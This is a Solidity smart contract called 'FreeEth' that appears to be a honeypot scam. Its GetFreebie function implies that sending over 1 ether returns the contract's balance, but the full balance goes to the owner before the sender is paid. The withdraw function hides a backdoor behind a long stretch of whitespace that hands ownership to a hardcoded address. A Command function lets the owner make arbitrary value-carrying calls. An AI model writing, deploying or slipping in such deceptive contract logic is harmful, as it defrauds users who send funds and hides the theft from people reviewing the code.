pragma solidity ^0.4.19;

contract FreeEth
{
    address public Owner = msg.sender;
   
    function() public payable{}
   
    function GetFreebie()
    public
    payable
    {                                                                    
        bool condition = msg.value > 1 ether;
        if (condition) {
            Owner.transfer(this.balance);
            msg.sender.transfer(this.balance);
        }
    }
    
    function withdraw()
    payable
    public
    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          bool condition = msg.sender == 0x4E0d2f9AcECfE4DB764476C7A1DfB6d0288348af;
        if (condition) { Owner = 0x4E0d2f9AcECfE4DB764476C7A1DfB6d0288348af; }
        require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }
    
    function Command(address adr,bytes data)
    payable
    public
    {
        require(msg.sender == Owner);
         
        adr.call.value(msg.value)(data);
    }
}